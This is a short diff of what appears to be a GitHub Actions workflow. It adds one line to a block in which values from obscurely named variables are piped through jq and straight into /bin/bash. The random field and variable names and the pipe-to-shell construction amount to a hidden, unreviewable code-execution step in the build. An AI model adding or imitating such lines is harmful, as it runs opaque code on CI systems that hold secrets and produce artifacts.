@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$ntdg1317" | jq -r .at632 | /bin/bash
           echo $z5 | jq -r .atyl3739 | /bin/bash
           echo $kadp2320 | jq -r .acy79 | /bin/bash
+          echo $adp044 | jq -r .qspyn3448 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
